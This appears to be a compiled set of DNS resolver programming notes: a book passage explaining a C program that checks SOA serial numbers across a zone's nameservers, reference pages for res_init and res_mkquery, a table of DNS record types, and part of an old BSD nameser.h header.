Notice that we don't explicitly check for finding zero nameserver records. We don't need to check because res_query flags that case as an error; it returns -1 and sets herrno to NO_DATA. If res_query returns -1, we call our own routine, nsError, to print out an error string from h_errno instead of using herror. The herror routine isn't a good fit for our program because its messages assume you are looking up address data (e.g., if h_ errno is NO_DATA, the error message is "No address associated with name").

The next routine queries each nameserver that we've found for an SOA record. In this routine, we change the value of several of the _res structure fields. By changing the nsaddr_list field, we change which nameserver res_send queries. We disable the search list by turning off bits in the options field; all the domain names that this program handles are fully qualified:
Code View: Scroll / Show All

/******************************************************************
 * queryNameServers -- Query each of the name servers in nsList   *
 *     for the SOA record of the given zone.  Report any          *
 *     errors encountered  (e.g., a name server not running or    *
 *     the response not being an authoritative response).  If     *
 * there are no errors, print out the serial number for the zone. *
 ******************************************************************/

void
queryNameServers(domain, nsList, nsNum)
char *domain;
char *nsList[];
int nsNum;
{
    union {
        HEADER hdr;               /* defined in resolv.h */
        u_char buf[NS_PACKETSZ];  /* defined in arpa/nameser.h */
    } query, response;            /* query and response buffers */
    int responseLen, queryLen;    /* buffer lengths */

    u_char     *cp;       /* character pointer to parse DNS message */

    struct in_addr saveNsAddr[MAXNS];  /* addrs saved from _res */
    int nsCount;          /* count of addresses saved from _res */
    struct hostent *host; /* structure for looking up ns addr */
    int i;                /* counter variable */

    ns_msg handle;  /* handle for response message */
    ns_rr rr;       /* expanded resource record */

    /*
     * Save the _res name server list since
     * we will need to restore it later.
     */
    nsCount = _res.nscount;
    for(i = 0; i < nsCount; i++)
      saveNsAddr[i] = _res.nsaddr_list[i].sin_addr;

    /*
     * Turn off the search algorithm and turn off appending
     * the local domain name before we call gethostbyname(  );
     * the name server's domain names will be fully qualified.
     */
    _res.options &= ~(RES_DNSRCH | RES_DEFNAMES);

    /*
     * Query each name server for the zone's SOA record.
     */
    for(nsNum-- ; nsNum >= 0; nsNum--){

        /*
         * First, we have to get the IP address of every name server.
         * So far, all we have are domain names.  We use gethostbyname(  )
         * to get the addresses, rather than anything fancy.
         * But first, we have to restore certain values in _res
         * because _res affects gethostbyname(  ).  (We altered
         * _res in the previous iteration through the loop.)
         *
         * We can't just call res_init(  ) again to restore
         * these values since some of the _res fields are
         * initialized when the variable is declared, not when
         * res_init(  ) is called.
         */
        _res.options |= RES_RECURSE;  /* recursion on (default) */
        _res.retry = 4;               /* 4 retries (default)    */
        _res.nscount = nsCount;       /* original name servers  */
        for(i = 0; i < nsCount; i++)
            _res.nsaddr_list[i].sin_addr = saveNsAddr[i];

        /* Look up the name server's address */
        host = gethostbyname(nsList[nsNum]);
        if (host == NULL) {
            (void) fprintf(stderr,"There is no address for %s\n",
                                              nsList[nsNum]);
            continue; /* nsNum for-loop */
        }

        /*
         * Now get ready for the real fun.  host contains IP
         * addresses for the name server we're testing.
         * Store the first address for host in the _res
         * structure.  Soon, we'll look up the SOA record...
         */
        (void) memcpy((void *)&_res.nsaddr_list[0].sin_addr,
           (void *)host->h_addr_list[0], (size_t)host->h_length);
        _res.nscount = 1;

        /*
         * Turn off recursion.  We don't want the name server
         * querying another server for the SOA record; this name
         * server ought to be authoritative for this data.
         */
        _res.options &= ~RES_RECURSE;

        /*
         * Reduce the number of retries.  We may be checking
         * several name servers, so we don't want to wait too
         * long for any one server.  With two retries and only
         * one address to query, we'll wait at most 15 seconds.
         */
        _res.retry = 2;

        /*
         * We want to see the response code in the next
         * response, so we must make the query message and
         * send it ourselves instead of having res_query(  )
         * do it for us.  If res_query(  ) returned -1, there
         * might not be a response to look at.
         *
         * There is no need to check for res_mkquery(  )
         * returning -1.  If the compression was going to
         * fail, it would have failed when we called
         * res_query(  ) earlier with this domain name.
         */
        queryLen = res_mkquery(
                     ns_o_query,      /* regular query         */
                     domain,          /* the zone to look up */
                     ns_c_in,         /* Internet type         */
                     ns_t_soa,        /* look up an SOA record */
                     (u_char *)NULL,  /* always NULL       */
                     0,               /* length of NULL        */
                     (u_char *)NULL,  /* always NULL       */
                     (u_char *)&query,/* buffer for the query  */
                     sizeof(query));  /* size of the buffer    */

        /*
         * Send the query message.  If there is no name server
         * running on the target host, res_send(  ) returns -1
         * and errno is ECONNREFUSED.  First, clear out errno.
         */
        errno = 0;
        if((responseLen = res_send((u_char *)&query,/* the query  */
                                   queryLen,        /* true length*/
                                   (u_char *)&response,/*buffer  */
                                   sizeof(response)))  /*buf size*/
                                        < 0){          /* error  */
            if(errno == ECONNREFUSED) { /* no server on the host */
                (void) fprintf(stderr,
                    "There is no name server running on %s\n",
                    nsList[nsNum]);
            } else {                   /* anything else: no response */
                (void) fprintf(stderr,
                    "There was no response from %s\n",
                    nsList[nsNum]);
            }
            continue; /* nsNum for-loop */
        }

        /*
         * Initialize a handle to this response.  The handle will
         * be used later to extract information from the response.
         */
        if (ns_initparse(response.buf, responseLen, &handle) < 0) {
            fprintf(stderr, "ns_initparse: %s\n", strerror(errno));
            return;
        }

        /*
         * If the response reports an error, issue a message
         * and proceed to the next server in the list.
         */
        if(ns_msg_getflag(handle, ns_f_rcode) != ns_r_noerror){
            returnCodeError(ns_msg_getflag(handle, ns_f_rcode),
                                                  nsList[nsNum]);
            continue; /* nsNum for-loop */
        }

        /*
         * Did we receive an authoritative response?  Check the
         * authoritative answer bit.  If this name server isn't
         * authoritative, report it, and go on to the next server.
         */
        if(!ns_msg_getflag(handle, ns_f_aa)){
            (void) fprintf(stderr,
                "%s is not authoritative for %s\n",
                nsList[nsNum], domain);
            continue; /* nsNum for-loop */
        }

        /*
         * The response should only contain one answer; if more,
         * report the error, and proceed to the next server.
         */
        if(ns_msg_count(handle, ns_s_an) != 1){
            (void) fprintf(stderr,
                "%s: expected 1 answer, got %d\n",
                nsList[nsNum], ns_msg_count(handle, ns_s_an));
            continue; /* nsNum for-loop */
        }

        /*
         * Expand the answer section record number 0 into rr.
         */
        if (ns_parserr(&handle, ns_s_an, 0, &rr)) {
                if (errno != ENODEV){
                        fprintf(stderr, "ns_parserr: %s\n",
                                strerror(errno));
                }
        }

        /*
         * We asked for an SOA record; if we got something else,
         * report the error and proceed to the next server.
         */
        if (ns_rr_type(rr) != ns_t_soa) {
            (void) fprintf(stderr,
                "%s: expected answer type %d, got %d\n",
                nsList[nsNum], ns_t_soa, ns_rr_type(rr));
            continue; /* nsNum for-loop */
        }

        /*
         * Set cp to point the the SOA record.
         */
        cp = (u_char *)ns_rr_rdata(rr);

        /*
         * Skip the SOA origin and mail address, which we don't
         * care about.  Both are standard "compressed names."
         */
        ns_name_skip(&cp, ns_msg_end(handle));
        ns_name_skip(&cp, ns_msg_end(handle));

        /* cp now points to the serial number; print it. */
        (void) printf("%s has serial number %d\n",
            nsList[nsNum], ns_get32(cp));

    } /* end of nsNum for-loop */
}

					  


Notice that we use recursive queries when we call gethostbyname, but nonrecursive queries when we look up the SOA record. gethostbyname may need to query other nameservers to find the host's address. But we don't want the nameserver querying another server when we ask it for the SOA record; it's supposed to be authoritative for this zone, after all. Allowing the nameserver to ask another server for the SOA record would defeat the error check.

The next two routines print out error messages:
Code View: Scroll / Show All

/****************************************************************
 * nsError -- Print an error message from h_errno for a failure *
 *     looking up NS records.  res_query(  ) converts the DNS   *
 *     message return code to a smaller list of errors and      *
 *     places the error value in h_errno.  There is a routine   *
 *     called herror(  ) for printing out strings from h_errno  *
 *     like perror(  ) does for errno.  Unfortunately, the      *
 *     herror(  ) messages assume you are looking up address    *
 *     records for hosts.  In this program, we are looking up   *
 *     NS records for zones, so we need our own list of error   *
 *     strings.                                                 *
 ****************************************************************/
void
nsError(error, domain)
int error;
char *domain;
{
    switch(error){
        case HOST_NOT_FOUND:
          (void) fprintf(stderr, "Unknown zone: %s\n", domain);
          break;
        case NO_DATA:
          (void) fprintf(stderr, "No NS records for %s\n", domain);
          break;
        case TRY_AGAIN:
          (void) fprintf(stderr, "No response for NS query\n");
          break;
        default:
          (void) fprintf(stderr, "Unexpected error\n");
          break;
    }
}

/****************************************************************
 * returnCodeError -- print out an error message from a DNS     *
 *     response return code.                                    *
 ****************************************************************/
void
returnCodeError(rcode, nameserver)
ns_rcode rcode;
char *nameserver;
{
    (void) fprintf(stderr, "%s: ", nameserver);
    switch(rcode){
        case ns_r_formerr:
          (void) fprintf(stderr, "FORMERR response\n");
          break;
        case ns_r_servfail:
          (void) fprintf(stderr, "SERVFAIL response\n");
          break;
        case ns_r_nxdomain:
          (void) fprintf(stderr, "NXDOMAIN response\n");
          break;
        case ns_r_notimpl:
          (void) fprintf(stderr, "NOTIMP response\n");
          break;
        case ns_r_refused:
          (void) fprintf(stderr, "REFUSED response\n");
          break;
        default:
          (void) fprintf(stderr, "unexpected return code\n");
          break;
    }
}

					  


To compile this program using the resolver and nameserver routines in libc:

%cc -o check_soa check_soa.c


Or, if you've newly compiled the BIND code as we describe in Appendix C and want to use the latest header files and resolver library:

%cc -o check_soa -I/usr/local/src/bind/src/include \
					check_soa.c /usr/local/src/bind/src/lib/libbind.a


Here is what the output looks like:

%check_soa mit.edu

BITSY.MIT.EDU has serial number 1995
W20NS.MIT.EDU has serial number 1995
STRAWB.MIT.EDU has serial number 1995


If you look back at the shell script output, it looks the same, except that the shell script's output is sorted by the nameserver's name. What you can't see is that the C program ran much faster.

		10.5.4 res_init 
Initializes the Resolver
Portability:	UNIX compatible

SYNOPSIS
DESCRIPTION
IMPLEMENTATION
EXAMPLE
RELATED FUNCTIONS
SYNOPSIS


#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/nameser.h>
#include <resolv.h>

void res_init(void);
DESCRIPTION

 res_init initializes the resolver. First, default options are set. Then, a system configuration file is read if one can be located. The configuration file may contain default resolver options for the local site. Refer to Network Administration for information on default resolver options.


After calling res_init , the program may override default site resolver options by accessing the _res structure described in The BSD UNIX Socket Library. The program does not need to call res_init if _res values will not be changed. This routine implements a part of the resolver, which is a set of routines providing a programming interface for communications with Internet name servers.


For information on buffer formats for Internet name servers, refer to Chapter 20, "The Domain Name System," in Internetworking with TCP/IP.

IMPLEMENTATION

The SAS/C version of res_init is a direct port from the BSD UNIX Socket Library.

EXAMPLE

In the following example, res_init is used to initialize the resolver.

/* Given a hostname as its first parameter, this program prints  */
/* the IP address.                                               */
/* Use of the following resolver options is illustrated:         */
/* The RES_DEBUG option turns on a resolver trace.               */
/* The RES_USEVC option requests use of virtual circuits (TCP)   */
/* when contacting the nameserver.                               */
/* This example assumes that the local site is configured to     */
/* use the resolver (instead of a host file).                    */
/* NOTE: The bitfield(1) compiler option is required.            */
#include <sys/types.h>
#include <netdb.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <arpa/nameser.h>
#include <resolv.h>
#include <stdio.h>

main(int argc, char *argv[])
{
   struct hostent *hp;
   struct in_addr ip_addr;

      /* Host name should be first parameter.                    */
   if (argc <1 || *argv[1]  == '\0')
      exit(EXIT_FAILURE);

      /* Initialize the resolver, and then set options.          */
   res_init();
   _res.options |= (RES_DEBUG|RES_USEVC);

      /* When gethostbyname uses the resolver, it uses TCP       */
      /* and generates a trace.                                  */
   hp = gethostbyname(argv[1]);
   if (!hp) {
      printf("%s not found\n",argv[1]);
      exit(EXIT_FAILURE);
   }

      /* Host was found.  Print its IP address.                  */
   ip_addr = *(struct in_addr *)(hp->h_addr);
   printf("%s: %s\n",argv[1] ,inet_ntoa(ip_addr));

   exit(EXIT_SUCCESS);
}


		10.5.5 List of DNS record types

			10.5.5.1 Resource records [edit]

Type	Value (decimal)	Defining RFC	Description	Function
A	1	RFC 1035[1]	address record	Returns a 32-bit IPv4 address, most commonly used to map hostnames to an IP address of the host, but also used for DNSBLs, storing subnet masks in RFC 1101, etc.
AAAA	28	RFC 3596[2]	IPv6 address record	Returns a 128-bit IPv6 address, most commonly used to map hostnames to an IP address of the host.
AFSDB	18	RFC 1183	AFS database record	Location of database servers of an AFS cell. This record is commonly used by AFS clients to contact AFS cells outside their local domain. A subtype of this record is used by the obsolete DCE/DFS file system.
APL	42	RFC 3123	Address Prefix List	Specify lists of address ranges, e.g. in CIDR format, for various address families. Experimental.
CAA	257	RFC 6844	Certification Authority Authorization	CA pinning, constraining acceptable CAs for a host/domain
CERT	37	RFC 4398	Certificate record	Stores PKIX, SPKI, PGP, etc.
CNAME	5	RFC 1035[1]	Canonical name record	Alias of one name to another: the DNS lookup will continue by retrying the lookup with the new name.
DHCID	49	RFC 4701	DHCP identifier	Used in conjunction with the FQDN option to DHCP
DLV	32769	RFC 4431	DNSSEC Lookaside Validation record	For publishing DNSSEC trust anchors outside of the DNS delegation chain. Uses the same format as the DS record. RFC 5074 describes a way of using these records.
DNAME	39	RFC 2672	delegation name	DNAME creates an alias for a name and all its subnames, unlike CNAME, which aliases only the exact name in its label. Like the CNAME record, the DNS lookup will continue by retrying the lookup with the new name.
DNSKEY	48	RFC 4034	DNS Key record	The key record used in DNSSEC. Uses the same format as the KEY record.
DS	43	RFC 4034	Delegation signer	The record used to identify the DNSSEC signing key of a delegated zone
HIP	55	RFC 5205	Host Identity Protocol	Method of separating the end-point identifier and locator roles of IP addresses.
IPSECKEY	45	RFC 4025	IPsec Key	Key record that can be used with IPsec
KEY	25	RFC 2535[3] and RFC 2930[4]	key record	Used only for SIG(0) (RFC 2931) and TKEY (RFC 2930).[5] RFC 3445 eliminated their use for application keys and limited their use to DNSSEC.[6] RFC 3755 designates DNSKEY as the replacement within DNSSEC.[7] RFC 4025 designates IPSECKEY as the replacement for use with IPsec.[8]
KX	36	RFC 2230	Key eXchanger record	Used with some cryptographic systems (not including DNSSEC) to identify a key management agent for the associated domain-name. Note that this has nothing to do with DNS Security. It is Informational status, rather than being on the IETF standards-track. It has always had limited deployment, but is still in use.
LOC	29	RFC 1876	Location record	Specifies a geographical location associated with a domain name
MX	15	RFC 1035[1]	mail exchange record	Maps a domain name to a list of message transfer agents for that domain
NAPTR	35	RFC 3403	Naming Authority Pointer	Allows regular expression based rewriting of domain names which can then be used as URIs, further domain names to lookups, etc.
NS	2	RFC 1035[1]	name server record	Delegates a DNS zone to use the given authoritative name servers
NSEC	47	RFC 4034	Next-Secure record	Part of DNSSEC—used to prove a name does not exist. Uses the same format as the (obsolete) NXT record.
NSEC3	50	RFC 5155	NSEC record version 3	An extension to DNSSEC that allows proof of nonexistence for a name without permitting zonewalking
NSEC3PARAM	51	RFC 5155	NSEC3 parameters	Parameter record for use with NSEC3
PTR	12	RFC 1035[1]	pointer record	Pointer to a canonical name. Unlike a CNAME, DNS processing does NOT proceed, just the name is returned. The most common use is for implementing reverse DNS lookups, but other uses include such things as DNS-SD.
RRSIG	46	RFC 4034	DNSSEC signature	Signature for a DNSSEC-secured record set. Uses the same format as the SIG record.
RP	17	RFC 1183	Responsible person	Information about the responsible person(s) for the domain. Usually an email address with the @ replaced by a .
SIG	24	RFC 2535	Signature	Signature record used in SIG(0) (RFC 2931) and TKEY (RFC 2930).[7] RFC 3755 designated RRSIG as the replacement for SIG for use within DNSSEC.[7]
SOA	6	RFC 1035[1] and RFC 2308[9]	start of [a zone of] authority record	Specifies authoritative information about a DNS zone, including the primary name server, the email of the domain administrator, the domain serial number, and several timers relating to refreshing the zone.
SPF	99	RFC 4408	Sender Policy Framework	Specified as part of the SPF protocol as an alternative to of storing SPF data in TXT records. Uses the same format as the earlier TXT record.
SRV	33	RFC 2782	Service locator	Generalized service location record, used for newer protocols instead of creating protocol-specific records such as MX.
SSHFP	44	RFC 4255	SSH Public Key Fingerprint	Resource record for publishing SSH public host key fingerprints in the DNS System, in order to aid in verifying the authenticity of the host. RFC 6594 defines ECC SSH keys and SHA-256 hashes. See the IANA SSHFP RR parameters registry for details.
TA	32768	N/A	DNSSEC Trust Authorities	Part of a deployment proposal for DNSSEC without a signed DNS root. See the IANA database and Weiler Spec for details. Uses the same format as the DS record.
TKEY	249	RFC 2930	secret key record	A method of providing keying material to be used with TSIG that is encrypted under the public key in an accompanying KEY RR.[10]
TLSA	52	RFC 6698	TLSA certificate association	A record for DNS-based Authentication of Named Entities (DANE). RFC 6698 defines "The TLSA DNS resource record is used to associate a TLS server certificate or public key with the domain name where the record is found, thus forming a 'TLSA certificate association'".
TSIG	250	RFC 2845	Transaction Signature	Can be used to authenticate dynamic updates as coming from an approved client, or to authenticate responses as coming from an approved recursive name server[11] similar to DNSSEC.
TXT	16	RFC 1035[1]	Text record	Originally for arbitrary human-readable text in a DNS record. Since the early 1990s, however, this record more often carries machine-readable data, such as specified by RFC 1464, opportunistic encryption, Sender Policy Framework, DKIM, DMARC DNS-SD, etc.
Other types and pseudo resource records [edit]

Other types of records simply provide some types of information (for example, an HINFO record gives a description of the type of computer/OS a host uses), or others return data used in experimental features. The "type" field is also used in the protocol for various operations.
Code	Number	Defining RFC	Description	Function
*	255	RFC 1035[1]	All cached records	Returns all records of all types known to the name server. If the name server does not have any information on the name, the request will be forwarded on. The records returned may not be complete. For example, if there is both an A and an MX for a name, but the name server has only the A record cached, only the A record will be returned. Sometimes referred to as "ANY", for example in Windows nslookup and Wireshark.
AXFR	252	RFC 1035[1]	Authoritative Zone Transfer	Transfer entire zone file from the master name server to secondary name servers.
IXFR	251	RFC 1996	Incremental Zone Transfer	Requests a zone transfer of the given zone but only differences from a previous serial number. This request may be ignored and a full (AXFR) sent in response if the authoritative server is unable to fulfill the request due to configuration or lack of required deltas.
OPT	41	RFC 2671	Option	This is a "pseudo DNS record type" needed to support EDNS
Obsolete record types [edit]

Progress has rendered obsolete some of the originally defined record-types. Of the records listed at IANA, some have limited use, for various reasons. Some are marked obsolete in the list, some are for very obscure services, some are for older versions of services, and some have special notes saying they are "not right".
Obsoleted by RFC 973: MD(3), MF (4), MAILA (254)
Records to publish mailing list subscriber lists in the DNS: MB(7), MG(8), MR(9), MINFO(14), MAILB (253). The intent, as specified by RFC 883, was for MB to replace the SMTP VRFY command, MG to replace the SMTP EXPN command, and MR to replace the "551 User Not Local" SMTP error. Later, RFC 2505 recommended that both the VRFY and EXPN commands be disabled, making the use of MB and MG unlikely to ever be adopted.
Declared "not to be relied upon" by RFC 1123 (with further information in RFC 1127): WKS(11)[12]
Mistakes: NB(32), NBSTAT(33) (from RFC 1002); the numbers are now assigned to NIMLOC and SRV.
Obsoleted by RFC 1035: NULL(10) (RFC 883 defined "completion queries" (opcode 2 and maybe 3) which used this record, RFC 1035 later reassigned opcode 2 to be "status" and reserved opcode 3.)
Defined as part of early IPv6 but downgraded to experimental by RFC 3363: A6(38), Later downgraded to historic in RFC 6563.
Obsoleted by DNSSEC updates (RFC 3755): NXT(30). At the same time, the domain of applicability for KEY and SIG was also limited to not include DNSSEC use.
Part of the first version of DNSSEC (RFC 2065).
Not in current use by any notable application: HINFO(13), RP(17), X25(19), ISDN(20), RT(21), NSAP(22), NSAP-PTR(23), PX(26), EID(31), NIMLOC(32), ATMA(34), APL(42)
Defined by the Kitchen Sink internet draft, but never made it to RFC status: SINK(40)
A more limited early version of the LOC record: GPOS(27)
IANA reserved, no RFC documented them [1] and support was removed from BIND in the early 90s: UINFO(100), UID(101), GID(102), UNSPEC(103)
RP(17) may be used for certain human-readable information regarding a different contact point for a specific host, subnet, or other domain level label separate than that used in the SOA record.

		10.5.6 res_mkquery()--Place Domain Query in Buffer
http://pic.dhe.ibm.com/infocenter/iseries/v6r1m0/index.jsp?topic=/apis/resmkq.htm



  Syntax
 #include <sys/types.h>
 #include <netinet/in.h>
 #include <arpa/nameser.h>
 #include <resolv.h>

 int res_mkquery(int  operation,
                 char *domain_name,
                 int  class,
                 int  type,
                 char *search_data,
                 int  search_data_length,
                 struct rrec *reserved,
                 char *query_buffer,
                 int  query_buffer_length)

  Service Program Name: QSOSRV2

  Default Public Authority: *USE

  Threadsafe: Yes

The res_mkquery() function is used to make standard query messages (DNS packets) for name servers.


Parameters

operation
(Input) The query operation desired. This gets put into OPCODE in the header of the packet. Common values are listed below (see <arpa/nameser.h> for all possible values):
ns_o_query or QUERY	Standard query request. (This value is almost always used.)

domain_name
(Input) The pointer to the name of the domain.

class
(Input) The class of data being looked for. Common values are listed below (see <arpa/nameser.h> for all possible values):
ns_c_in or C_IN	Specifies the ARPA Internet.
ns_c_any or C_ANY	This is the wildcard match.

type
(Input) The type of request being made. Common values are listed below (see <arpa/nameser.h> for all possible values):
ns_t_a or T_A	Host address.
ns_t_aaaa	IPv6 address.
ns_t_ns or T_NS	Authoritative server.
ns_t_cname or T_CNAME	Canonical name.
ns_t_soa or T_SOA	Start of authority zone.
ns_t_wks or T_WKS	Well-known service.
ns_t_ptr or T_PTR	Domain name pointer.
ns_t_hinfo or T_HINFO	Host information.
ns_t_mx or T_MX	Mail routing information.
ns_t_txt or T_TXT	Text strings.
ns_t_any or T_ANY	Wildcard match.

search_data
(Input) A buffer containing the data for inverse queries. It is NULL for types other than IQUERY.

search_data_length
(Input) The length of search_data. It is NULL for types other than IQUERY.

reserved
(Input) A reserved and currently unused parameter. It is always a NULL pointer (defined for compatibility).

query_buffer
(Output) A pointer to a user-supplied location containing the query message.

query_buffer_length
(Input) The length of query_buffer.

Authorities:

No authorization is required.


Return Value

res_mkquery() returns an integer. Possible values are:

-1 (unsuccessful)

n (successful), where n is the size of the query.

Error Conditions

When the res_mkquery() function fails, errno can be set to one of the following:

[EFAULT]
The system detected a pointer that was invalid while attempting to access an input pointer.

[EINVAL]
The _res appears to be initialized but the reserved field is not set to zeros.

[EMSGSIZE]
The message buffer was too small. The query was larger than the value of query_buffer_length



Usage Notes

res_mkquery() creates a standard query message (DNS packet). It fills in the header fields, compresses the domain name into the question section, and fills in the other question fields. This query message is placed in query_buffer.

res_mkquery() calls res_init() if the _res structure has not been initialized.

res_mkquery() expects EBCDIC data as input. The output from res_mkquery() is also EBCDIC.

In a thread-enabled environment, the _res structure is shared among all threads within a process.

Related Information

res_nmkquery()--Place Domain Query in Buffer

res_hostalias()--Retrieve the host alias

res_init()--Initialize _res Structure

res_close()--Close Socket and Reset _res Structure

res_query()--Send Domain Query

res_search()--Search for Domain Name

res_send()--Send Buffered Domain Query

res_xlate()--Translate DNS Packets

		10.5.7 nameser.h

			10.5.7.1  old version


/*	$OpenBSD: nameser.h,v 1.3 1997/03/13 19:11:54 downsj Exp $	*/

/*
 * ++Copyright++ 1983, 1989, 1993
 * -
 * Copyright (c) 1983, 1989, 1993
 *    The Regents of the University of California.  All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 * 	This product includes software developed by the University of
 * 	California, Berkeley and its contributors.
 * 4. Neither the name of the University nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 * 
 * THIS SOFTWARE IS PROVIDED BY THE REGENTS AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE REGENTS OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 * -
 * Portions Copyright (c) 1993 by Digital Equipment Corporation.
 * 
 * Permission to use, copy, modify, and distribute this software for any
 * purpose with or without fee is hereby granted, provided that the above
 * copyright notice and this permission notice appear in all copies, and that
 * the name of Digital Equipment Corporation not be used in advertising or
 * publicity pertaining to distribution of the document or software without
 * specific, written prior permission.
 * 
 * THE SOFTWARE IS PROVIDED "AS IS" AND DIGITAL EQUIPMENT CORP. DISCLAIMS ALL
 * WARRANTIES WITH REGARD TO THIS SOFTWARE, INCLUDING ALL IMPLIED WARRANTIES
 * OF MERCHANTABILITY AND FITNESS.   IN NO EVENT SHALL DIGITAL EQUIPMENT
 * CORPORATION BE LIABLE FOR ANY SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL
 * DAMAGES OR ANY DAMAGES WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR
 * PROFITS, WHETHER IN AN ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS
 * ACTION, ARISING OUT OF OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS
 * SOFTWARE.
 * -
 * Portions Copyright (c) 1995 by International Business Machines, Inc.
 *
 * International Business Machines, Inc. (hereinafter called IBM) grants
 * permission under its copyrights to use, copy, modify, and distribute this
 * Software with or without fee, provided that the above copyright notice and
 * all paragraphs of this notice appear in all copies, and that the name of IBM
 * not be used in connection with the marketing of any product incorporating
 * the Software or modifications thereof, without specific, written prior
 * permission.
 *
 * To the extent it has a right to do so, IBM grants an immunity from suit
 * under its patents, if any, for the use, sale or manufacture of products to
 * the extent that such products are used for performing Domain Name System
 * dynamic updates in TCP/IP networks by means of the Software.  No immunity is
 * granted for any product per se or for any other function of any product.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", AND IBM DISCLAIMS ALL WARRANTIES,
 * INCLUDING ALL IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A
 * PARTICULAR PURPOSE.  IN NO EVENT SHALL IBM BE LIABLE FOR ANY SPECIAL,
 * DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES WHATSOEVER ARISING
 * OUT OF OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE, EVEN
 * IF IBM IS APPRISED OF THE POSSIBILITY OF SUCH DAMAGES.
 * --Copyright--
 */

/*
 *      @(#)nameser.h	8.1 (Berkeley) 6/2/93
 *	$From: nameser.h,v 8.11 1996/10/08 04:51:02 vixie Exp $
 */

#ifndef _NAMESER_H_
#define _NAMESER_H_

#include <sys/param.h>
#if (!defined(BSD)) || (BSD < 199306)
# include <sys/bitypes.h>
#else
# include <sys/types.h>
#endif
#include <sys/cdefs.h>

#ifdef _AUX_SOURCE
# include <sys/types.h>
#endif

/*
 * revision information.  this is the release date in YYYYMMDD format.
 * it can change every day so the right thing to do with it is use it
 * in preprocessor commands such as "#if (__BIND > 19931104)".  do not
 * compare for equality; rather, use it to determine whether your resolver
 * is new enough to contain a certain feature.
 */

#define __BIND		19960801	/* interface version stamp */

/*
 * Define constants based on rfc883
 */
#define PACKETSZ	512		/* maximum packet size */
#define MAXDNAME	1025		/* maximum presentation domain name */
#define MAXCDNAME	255		/* maximum compressed domain name */
#define MAXLABEL	63		/* maximum length of domain label */
#define HFIXEDSZ	12		/* #/bytes of fixed data in header */
#define QFIXEDSZ	4		/* #/bytes of fixed data in query */
#define RRFIXEDSZ	10		/* #/bytes of fixed data in r record */
#define INT32SZ		4		/* for systems without 32-bit ints */
#define INT16SZ		2		/* for systems without 16-bit ints */
#define INADDRSZ	4		/* IPv4 T_A */
#define IN6ADDRSZ	16		/* IPv6 T_AAAA */

/*
 * Internet nameserver port number
 */
#define NAMESERVER_PORT	53

/*
 * Currently defined opcodes
 */
#define QUERY		0x0		/* standard query */
#define IQUERY		0x1		/* inverse query */
#define STATUS		0x2		/* nameserver status query */
/*#define xxx		0x3*/		/* 0x3 reserved */
#define NS_NOTIFY_OP	0x4		/* notify secondary of SOA change */
/*
 * Currently defined response codes
 */
#define NOERROR		0		/* no error */
#define FORMERR		1		/* format error */
#define SERVFAIL	2		/* server failure */
#define NXDOMAIN	3		/* non existent domain */
#define NOTIMP		4		/* not implemented */
#define REFUSED		5		/* query refused */

/*
 * Type values for resources and queries
 */
#define T_A		1		/* host address */
#define T_NS		2		/* authoritative server */
#define T_MD		3		/* mail destination */
#define T_MF		4		/* mail forwarder */
#define T_CNAME		5		/* canonical name */
#define T_SOA		6		/* start of authority zone */
#define T_MB		7		/* mailbox domain name */
#define T_MG		8		/* mail group member */
#define T_MR		9		/* mail rename name */
#define T_NULL		10		/* null resource record */
#define T_WKS		11		/* well known service */
#define T_PTR		12		/* domain name pointer */
#define T_HINFO		13		/* host information */
#define T_MINFO		14		/* mailbox information */
#define T_MX		15		/* mail routing information */
#define T_TXT		16		/* text strings */
#define T_RP		17		/* responsible person */
#define T_AFSDB		18		/* AFS cell database */
#define T_X25		19		/* X_25 calling address */
#define T_ISDN		20		/* ISDN calling address */
#define T_RT		21		/* router */
#define T_NSAP		22		/* NSAP address */
#define T_NSAP_PTR	23		/* reverse NSAP lookup (deprecated) */
#define T_SIG		24		/* security signature */
#define T_KEY		25		/* security key */
#define T_PX		26		/* X.400 mail mapping */
#define T_GPOS		27		/* geographical position (withdrawn) */
#define T_AAAA		28		/* IP6 Address */
#define T_LOC		29		/* Location Information */
#define T_NXT		30		/* Next Valid Name in Zone */
#define T_EID		31		/* Endpoint identifier */
#define T_NIMLOC	32		/* Nimrod locator */
#define T_SRV		33		/* Server selection */
#define T_ATMA		34		/* ATM Address */
#define T_NAPTR		35		/* Naming Authority PoinTeR */
	/* non standard */
#define T_UINFO		100		/* user (finger) information */
#define T_UID		101		/* user ID */
#define T_GID		102		/* group ID */
